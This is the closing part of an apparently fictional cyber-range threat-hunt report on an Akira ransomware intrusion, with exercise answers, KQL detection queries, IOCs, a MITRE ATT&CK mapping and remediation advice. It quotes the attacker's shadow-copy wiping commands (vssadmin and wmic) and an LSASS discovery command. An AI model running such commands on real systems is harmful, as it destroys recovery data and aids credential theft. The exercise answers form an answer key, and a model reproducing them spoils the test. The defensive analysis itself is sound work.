Volume Shadow Copies were destroyed prior to encryption. Both `wmic shadowcopy delete` and `vssadmin delete shadows /all /quiet` were executed — confirming redundant VSS wiping.

---

### 🚩 Q37 — Ransom Note Origin Process `[Advanced]`

> **Answer:** `updater.exe`

The ransom note (`akira_readme.txt`) was dropped by `updater.exe` itself, confirming the ransomware binary handles both encryption and victim notification.

---

### 🚩 Q38 — Encryption Start Time `[Advanced]`

> **Answer:** `22:18:33`

The creation timestamp of the first ransom note (22:18:33 UTC, 2026-01-27) marks the definitive onset of the encryption phase.

---

## Section 12 — Anti-Forensics & Scope

Following ransomware execution, the threat actor deployed a cleanup script to delete the ransomware binary, reducing forensic artefacts recoverable from the endpoint.

### KQL — Cleanup and Scope Confirmation (Q39, Q40)

```kql
// Q39 - Cleanup batch script
DeviceFileEvents
| where TimeGenerated > ago(90d)
| where DeviceName in~ ("as-pc1","as-pc2")
| where FileName endswith ".bat"
| where FolderPath has_any ("ProgramData","Users\Public")
| project TimeGenerated, DeviceName, FileName, FolderPath, SHA256,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated desc

// Q40 - Scope: hosts running updater.exe
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-27) .. datetime(2026-01-28))
| where FileName == "updater.exe"
| summarize count() by DeviceName
```

#### 📋 MDE Result — updater.exe execution count confirms compromise scope (Q40)

| DeviceName | count_ |
|---|---|
| as-srv | 72 |
| as-pc2 | 60 |

---

### 🚩 Q39 — Cleanup Script `[Hard]`

> **Answer:** `Clean.bat`

`Clean.bat` was executed post-encryption to delete `updater.exe`. Follows the same capitalisation convention as `kill.bat`, suggesting a standardised attacker toolkit. Designed to slow forensic recovery and reverse engineering.

---

### 🚩 Q40 — Affected Hosts `[Hard]`

> **Answer:** `as-pc2, as-srv`

Two hosts confirmed compromised: **AS-PC2** (initial access origin, credential theft, lateral movement launch) and **AS-SRV** (ransomware deployment, file encryption, exfiltration target).

---

## Appendix A — Indicators of Compromise (IOCs)

> ⚠️ Do not submit file hashes to VirusTotal or any public reputation service without prior authorisation.

### Domains

| Indicator | Context |
|---|---|
| `sync.cloud-endpoint.net` | Payload hosting / C2 |
| `cdn.cloud-endpoint.net` | Ransomware staging |
| `relay-0b975d23.net.anydesk.com` | AnyDesk relay (primary) |
| `relay-c6eb91af.net.anydesk.com` | AnyDesk relay (secondary) |
| `relay-b8f8a0be.net.anydesk.com` | AnyDesk relay (secondary) |

### IP Addresses

| Indicator | Context |
|---|---|
| `172.67.174.46` | C2 infrastructure (sync.cloud-endpoint.net) |
| `104.21.30.237` | C2 infrastructure (cdn.cloud-endpoint.net) |
| `88.97.164.155` | Attacker external IP (AnyDesk session) |

### File Hashes (SHA256)

| Hash | Filename | Context |
|---|---|---|
| `0e7da57d92eaa6bda9d0bbc24b5f0827250aa42f295fd056ded50c6e3c3fb96c` | kill.bat | Defense evasion script |
| `66b876c52946f4aed47dd696d790972ff265b6f4451dab54245bc4ef1206d90b` | wsync.exe | C2 beacon (original) |
| `0072ca0d0adc9a1b2e1625db4409f57fc32b5a09c414786bf08c4d8e6a073654` | wsync.exe | C2 beacon (replacement) |
| `26d5748ffe6bd95e3fee6ce184d388a1a681006dc23a0f08d53c083c593c193b` | scan.exe | Network scanner |
| `512a1f4ed9f512572608c729a2b89f44ea66a40433073aedcd914bd2d33b7015` | st.exe | Data staging tool |
| `e609d070ee9f76934d73353be4ef7ff34b3ecc3a2d1e5d052140ed4cb9e4752b` | updater.exe | Akira ransomware binary |

### Files & Artefacts

| Filename | Path | Context |
|---|---|---|
| `kill.bat` | C:\ProgramData\ | Defense evasion script |
| `wsync.exe` | C:\ProgramData\ | C2 beacon |
| `scan.exe` | C:\Users\david.mitchell\Downloads\ | Network scanner (Advanced IP Scanner) |
| `st.exe` | C:\ProgramData\ | Data staging / compression tool |
| `exfil_data.zip` | AS-SRV | Exfiltration archive |
| `updater.exe` | C:\ProgramData\ | Akira ransomware binary |
| `Clean.bat` | AS-SRV | Anti-forensics cleanup script |
| `akira_readme.txt` | Multiple directories on AS-SRV | Ransom note |

### Accounts

| Account | Context |
|---|---|
| `david.mitchell` | Compromised user on AS-PC2 |
| `as.srv.administrator` | Local admin used for lateral movement to AS-SRV |

### TOR

| Indicator | Context |
|---|---|
| `akiral2iz6a7qgd3ayp3l6yub7xx2uep76idk3u2kollpj5z3z636bad.onion` | Akira negotiation portal |

---

## Appendix B — MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique | Observed Activity |
|---|---|---|---|
| Initial Access | T1133 | External Remote Services | AnyDesk pre-staged from prior compromise |
| Execution | T1059.001 | PowerShell | Invoke-WebRequest, powershell.exe staging ransomware |
| Persistence | T1543 | Create/Modify System Process | wsync.exe C2 beacon dropped in ProgramData |
| Defense Evasion | T1562.001 | Disable or Modify Tools | kill.bat + DisableAntiSpyware registry modification |
| Defense Evasion | T1036.005 | Match Legitimate Name/Location | updater.exe masquerading as Windows update process |
| Credential Access | T1003.001 | LSASS Memory | tasklist \| findstr lsass + named pipe lsass access |
| Discovery | T1046 | Network Service Scanning | scan.exe portable network enumeration |
| Discovery | T1135 | Network Share Discovery | net view against 10.1.0.154, 10.1.0.183 |
| Lateral Movement | T1021.002 | SMB/Windows Admin Shares | as.srv.administrator lateral auth to AS-SRV |
| Command & Control | T1219 | Remote Access Software | AnyDesk via relay-0b975d23.net.anydesk.com |
| Command & Control | T1071.001 | Application Layer Protocol: Web | wsync.exe beacon over HTTP/HTTPS |
| Exfiltration | T1560.001 | Archive via Utility | st.exe creating exfil_data.zip |
| Impact | T1486 | Data Encrypted for Impact | updater.exe Akira ransomware deployment |
| Impact | T1490 | Inhibit System Recovery | wmic shadowcopy delete + vssadmin delete shadows |

---

## Recommendations

1. **Block all IOC domains and IPs** at the perimeter firewall and internal DNS resolver immediately — `sync.cloud-endpoint.net`, `cdn.cloud-endpoint.net`, `172.67.174.46`, `104.21.30.237`.
2. **Isolate and reimage AS-PC2 and AS-SRV.** Do not attempt in-place remediation given the depth of compromise and confirmed anti-forensics activity.
3. **Reset all credentials** associated with `david.mitchell` and `as.srv.administrator`. Treat all cached credentials on both hosts as fully compromised.
4. **Audit all privileged accounts** for unauthorised changes. Review the original Broker incident access vector to identify any additional harvested credentials not yet used.
5. **Implement Application Control** (WDAC or AppLocker) to prevent unsigned binary execution from `C:\Users\Public`, `C:\ProgramData\`, and other user-writable paths.
6. **Enable Microsoft Credential Guard** to prevent LSASS memory access via the named pipe interface exploited during this intrusion.
7. **Restrict BitsAdmin and PowerShell download capability** via Group Policy. Apply Constrained Language Mode for PowerShell where operationally feasible.
8. **Deploy an AnyDesk allowlist policy** restricting connections to approved relay domains and external IPs. If AnyDesk is not a business requirement, block its execution entirely.
9. **Protect VSS snapshots** using tamper-resistant backup solutions that cannot be deleted via `wmic` or `vssadmin` from compromised user or administrator context.
10. **Engage with the Akira negotiation portal only through qualified legal counsel.** Preserve victim ID `813R-QWJM-XKIJ` for all incident records and insurance correspondence.

---

*Report produced as part of the SancLogic Cyber Range — The Buyer (Advanced) threat hunt exercise.*
*Platform: Microsoft Defender for Endpoint + Microsoft Sentinel | Query Language: KQL*
